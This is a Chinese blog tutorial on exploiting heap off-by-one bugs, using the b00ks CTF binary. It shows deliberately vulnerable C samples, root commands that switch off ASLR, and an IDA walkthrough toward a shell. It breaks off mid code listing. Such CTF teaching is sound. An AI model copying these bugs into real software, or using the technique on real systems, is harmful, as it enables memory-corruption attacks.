<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（3-2-1）-堆中的off-by-one | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="注意：本程序 exp 已经过验证，为有效 payload，请勿使用 ubuntu 16.04 进行执行（libc-2.23），否则无法 getshell    参考资料：https:&#x2F;&#x2F;wzt.ac.cn&#x2F;2018&#x2F;10&#x2F;08&#x2F;s-pwn-project-2&#x2F; #payload 来源https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;1081166">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（3-2-1）-堆中的off-by-one">
<meta property="og:url" content="https://cyberangel.cn/2020/09/07/PWN%E5%85%A5%E9%97%A8%EF%BC%883-2-1%EF%BC%89-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="注意：本程序 exp 已经过验证，为有效 payload，请勿使用 ubuntu 16.04 进行执行（libc-2.23），否则无法 getshell    参考资料：https:&#x2F;&#x2F;wzt.ac.cn&#x2F;2018&#x2F;10&#x2F;08&#x2F;s-pwn-project-2&#x2F; #payload 来源https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;1081166">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-09-07T11:35:40.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:16.443Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/09/07/PWN%E5%85%A5%E9%97%A8%EF%BC%883-2-1%EF%BC%89-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（3-2-1）-堆中的off-by-one',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（3-2-1）-堆中的off-by-one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-07T11:35:40.000Z" title="发表于 2020-09-07 19:35:40">2020-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:16.443Z" title="更新于 2021-07-04 17:57:16">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>44分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（3-2-1）-堆中的off-by-one"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/09/07/PWN%E5%85%A5%E9%97%A8%EF%BC%883-2-1%EF%BC%89-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>注意：本程序 exp 已经过验证，为有效 payload，请勿使用 ubuntu 16.04 进行执行（libc-2.23），否则无法 getshell</p>
</blockquote>
<hr>
<blockquote>
<p>参考资料：<br><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2018/10/08/s-pwn-project-2/">https://wzt.ac.cn/2018/10/08/s-pwn-project-2/</a> #payload 来源<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108116618">https://blog.csdn.net/qq_41202237/article/details/108116618</a> #主要行文思路</p>
</blockquote>
<hr>
<blockquote>
<p>附件下载：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1A3O9oTaXh2DANTDZPQGj8g">https://pan.baidu.com/s/1A3O9oTaXh2DANTDZPQGj8g</a><br>提取码：yntv</p>
</blockquote>
<h1 id="简介及定义"><a href="#简介及定义" class="headerlink" title="简介及定义"></a>简介及定义</h1><p>off-by-one 这项技术不仅适用于堆，<strong>而且适用于栈</strong>。但是在 CTF 中最常见的还是在堆中的应用。严格来说 off-by-one 是一种特殊的溢出漏洞，当程序在缓冲区写入并溢出时，写入的字节数超过了这个缓冲区本身所申请的字节数且只越界了一个字节。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>off-by-one 这种漏洞的形成和整形溢出很相似，往往都是由于对边界的检查不够严谨，当然也不排除和写入的 size 正好就只多了一个字节的情况。边界验证不严谨通常有两种情况：</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误，导致多写入了一个字节，这篇文章讲的就是这个漏洞</li>
<li>对字符串长度判断有误</li>
</ul>
<h1 id="漏洞原理举例"><a href="#漏洞原理举例" class="headerlink" title="漏洞原理举例"></a>漏洞原理举例</h1><h2 id="0、for-循环语法回顾"><a href="#0、for-循环语法回顾" class="headerlink" title="0、for 循环语法回顾"></a>0、for 循环语法回顾</h2><p>首先来回顾一下 for 循环的语法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( init; condition; increment )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">statement</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是 for 循环的控制流：</p>
<ol>
<li><strong>init</strong> 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。</li>
<li>接下来，会判断 <strong>condition</strong>。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。</li>
<li><strong>在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。</strong>该语句可以留空，只要在条件后有一个分号出现即可。</li>
<li>条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。</li>
</ol>
<h2 id="1、溢出之循环边界不严谨"><a href="#1、溢出之循环边界不严谨" class="headerlink" title="1、溢出之循环边界不严谨"></a>1、溢出之循环边界不严谨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这个例子首先创建了两个 char 类型的指针，分别指向 malloc(16)出来的 chunk1 和 chunk2。接着调用 my_gets 函数传入了 chunk1 的指针和 16byte 大小的空间，进入 for 循环调用 getchar 函数进行输入。<br>值得注意的是：for 循环这个语句：for(i = 0; i &lt;= 16; i++)，由于 i 是从 0 开始的，<strong>并且 i&lt;=16，也就是说循环实际上是执行了 17 次的，这就导致了 chunk1 会溢出一个字节。</strong></p>
<h2 id="2、对字符串长度判断有误"><a href="#2、对字符串长度判断有误" class="headerlink" title="2、对字符串长度判断有误"></a>2、对字符串长度判断有误</h2><p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>strlen 函数的声明如下：<br>size_t strlen(const char *str)<br>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，<strong>直到空结束字符，但不包括空结束字符</strong>。<br><strong>（请注意这一点，这对 if 语句的判断十分重要）</strong></p>
</blockquote>
<p>来看一下这个程序的流程：首先创建了 40 字节的字符串 buffer，然后 void 出一个 chunk 指针指向 malloc(24)，利用 gets 函数对 buffer 进行输入，如果是输入的为 24 字节就使用 strcpy 复制到堆中。<br>请注意：有一个隐形的东西值得我们注意–字符串结束符\x00。调用 gets 函数后，\x00 会自动的添加在输入的字符串中，当 strcpy 进行拷贝时，会将\x00 存入到堆块中，进一步说 chunk1 中写入了 25 个字节。这就导致了 chunk1 溢出了一个字节。</p>
<h1 id="实例讲解"><a href="#实例讲解" class="headerlink" title="实例讲解"></a>实例讲解</h1><p>我们使用 CTF-wiki 上的 Asis_2016_b00ks 进行讲解</p>
<blockquote>
<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p>
</blockquote>
<p>首先检查一下文件的保护情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599480856859-72815fae-7c60-43ff-89cb-f479b7428f85.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907201359.png&originHeight=139&originWidth=419&size=21160&status=done&style=none&width=419" alt="QQ截图20200907201359.png"><br>可以看到这是 64 位程序，除了 canary 保护其他全开。<br>由于这是一个简单的讲解，所以我们可以将 PIE 保护关掉，进一步说我们可以关掉 Linux 系统的 ASLR。</p>
<blockquote>
<p>关闭系统的 ASLR，执行命令：<br>$ sudo su<br>[sudo] password : 你自己的密码<br>cat /proc/sys/kernel/randomize_va_space<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>cat /proc/sys/kernel/randomize_va_space<br>请不要担心，<strong>重启虚拟机之后 ASLR 会自动开启</strong></p>
</blockquote>
<h1 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h1><p>将程序下载下来，执行命令“chmod 777 b00ks”授予 ELF 文件权限以执行。<br>运行一下，粗略的查看一下程序的执行流程：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599481597117-30c31626-a18a-48ae-8734-e3f68a960684.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907202628.png&originHeight=652&originWidth=376&size=54615&status=done&style=none&width=247" alt="QQ截图20200907202628.png"><br>程序运行程序之后输入一个作者的名称，接着出来几个选项让我们选择（如下图所示）：<br>1、创建图书<br>2、删除图书<br>3、编辑图书<br>4、打印所有图书的详细信息<br>5、更改现有的作者名称</p>
<h2 id="1-0、创建图书"><a href="#1-0、创建图书" class="headerlink" title="1-0、创建图书"></a>1-0、创建图书</h2><p>我们来看一下创建图书的功能<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599482367308-3ab7ac98-c771-474e-86ed-8350ffe381dd.png#align=left&display=inline&height=129&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907203836.png&originHeight=129&originWidth=325&size=10167&status=done&style=none&width=325" alt="QQ截图20200907203836.png"><br>这个功能很简单，我们只需要输入四个内容：书名大小、书名、书类型大小、书类型</p>
<blockquote>
<p>description：描述</p>
</blockquote>
<p>可以通过 payload 自动化调用程序中的 create 函数，以代替我们手动创建图书，使用 payload 表示如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599981765315-c03ac08e-7a39-48a0-a22f-72aec5d28b7b.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913152238.png&originHeight=182&originWidth=473&size=34941&status=done&style=none&width=473" alt="QQ截图20200913152238.png"></p>
<h2 id="2、删除图书"><a href="#2、删除图书" class="headerlink" title="2、删除图书"></a>2、删除图书</h2><p>使用删除功能需要输入图书的 id，图书的 id 是创建图书的时候就开始从 1 分配的，可以创建 payload 的 deletebook 函数来进行自动化删除。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599486645321-d50a1c2f-6493-4737-835e-58a44297c19f.png#align=left&display=inline&height=42&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907214856.png&originHeight=42&originWidth=378&size=4009&status=done&style=none&width=378" alt="QQ截图20200907214856.png"><br>使用 payload 表示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599981790608-ba142a4e-8a90-465e-9696-56092f7ea8d4.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913152303.png&originHeight=81&originWidth=523&size=12974&status=done&style=none&width=523" alt="QQ截图20200913152303.png"></p>
<h2 id="1-1、编辑图书"><a href="#1-1、编辑图书" class="headerlink" title="1-1、编辑图书"></a>1-1、编辑图书</h2><p>由于我们上面将刚刚创建的图书内容进行了删除，所以需要重新创建 book：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599486832842-291f0173-e254-4c2b-ba1e-332215d1683e.png#align=left&display=inline&height=121&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907215335.png&originHeight=121&originWidth=389&size=10747&status=done&style=none&width=389" alt="QQ截图20200907215335.png"><br>然后我们再来打印出 book 的详细信息：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599486910832-5af1afbe-a641-4f83-acdc-dfd0ebd0bdde.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907215502.png&originHeight=92&originWidth=172&size=6280&status=done&style=none&width=172" alt="QQ截图20200907215502.png"><br>从上面输出的信息可以看到，当第一个图书的信息被删除之后，重新录入后的 book 并不会使用之前被删除的 ID，而是递增使用新 ID。</p>
<h2 id="3、修改图书的类型"><a href="#3、修改图书的类型" class="headerlink" title="3、修改图书的类型"></a>3、修改图书的类型</h2><p>在程序中输入 3 以修改图书的类型：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599487752280-ac32763e-70e4-463b-bbb0-6f9214800ce4.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907220904.png&originHeight=56&originWidth=345&size=5830&status=done&style=none&width=345" alt="QQ截图20200907220904.png"><br>然后再打印一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599487854009-0a2ab6e2-a79f-4e30-b748-98c50ebcf041.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907221046.png&originHeight=92&originWidth=183&size=6394&status=done&style=none&width=183" alt="QQ截图20200907221046.png"></p>
<p>修改图书类型需要输入两个内容：图书 id、新的图书类型，payload 如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599981856043-ae9bc592-cec0-480a-9c9e-7b6799bbb77a.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913152409.png&originHeight=110&originWidth=509&size=20090&status=done&style=none&width=509" alt="QQ截图20200913152409.png"></p>
<h2 id="4、打印图书的信息"><a href="#4、打印图书的信息" class="headerlink" title="4、打印图书的信息"></a>4、打印图书的信息</h2><p>直接打印一下图书的数据信息，当然，和上面的一样：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599488648197-c7101193-8169-48cf-8c2c-d301e6e60da6.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907222358.png&originHeight=92&originWidth=171&size=6362&status=done&style=none&width=171" alt="QQ截图20200907222358.png"><br>打印信息只需要输入程序功能的序号 4 就会打印出所有的图书信息：图书 id、书名、书的类型、作者名。使用 payload 传入程序功能序号 4 就行了。</p>
<h2 id="5、修改作者名"><a href="#5、修改作者名" class="headerlink" title="5、修改作者名"></a>5、修改作者名</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599489842503-44075e36-4ab9-4b74-8337-d7f2a1873368.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200907224352.png&originHeight=246&originWidth=378&size=20470&status=done&style=none&width=378" alt="QQ截图20200907224352.png"><br>这个功能只需要我们输入新的作者名，可以使用 payload 中向程序中传入 5 以执行修改作者名的功能。</p>
<h1 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h1><p>大概的内容看完了，接下来就该看 IDA 的静态分析了。<br>IDA 在堆中的作用很大，它可以帮助我们分析出程序的漏洞。</p>
<h2 id="main-函数分析"><a href="#main-函数分析" class="headerlink" title="main 函数分析"></a>main 函数分析</h2><p>将文件载入到 IDA 中，首先先来看 main 函数：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599525051203-2fa65adb-6188-430a-bce3-41a973ba3ceb.png#align=left&display=inline&height=672&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908083035.png&originHeight=672&originWidth=778&size=46557&status=done&style=none&width=778" alt="QQ截图20200908083035.png"><br>如上图所示，已经对 main 函数进行了注释，接下来重点看程序的主要功能，首先进入 sub_B6D()，大致的语句注释如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599525501753-b2e12c43-3b88-4224-8e3f-5e5fab4c4577.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908083813.png&originHeight=127&originWidth=610&size=10072&status=done&style=none&width=610" alt="QQ截图20200908083813.png"><br>由于已经对函数和变量进行了重命名，我们可以先双击 read_data_to_heap 来看一下此函数：（请注意传入的参数）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599525617563-71430df1-eb5b-45c6-ba59-aaf473bb8131.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908084008.png&originHeight=430&originWidth=622&size=22623&status=done&style=none&width=622" alt="QQ截图20200908084008.png"><br>从上面的图可以看出存在着 for 循环，经过仔细的分析发现循环实际上是运行了 33 次。<br>文章开头我们可以知道这里存在着单字节溢出漏洞。<br>返回，看一下 book_author_name_ptr：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599525843975-59e90a54-b578-40ee-bc29-249b12de2a47.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908084355.png&originHeight=103&originWidth=845&size=11485&status=done&style=none&width=845" alt="QQ截图20200908084355.png"><br>可以看到这个变量的指针保存在 offset 的 0x202018 处。请在记事本中记下这个地址，之后要使用到。</p>
<h2 id="创建图书功能分析"><a href="#创建图书功能分析" class="headerlink" title="创建图书功能分析"></a>创建图书功能分析</h2><p>sub_F55 函数和注释如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 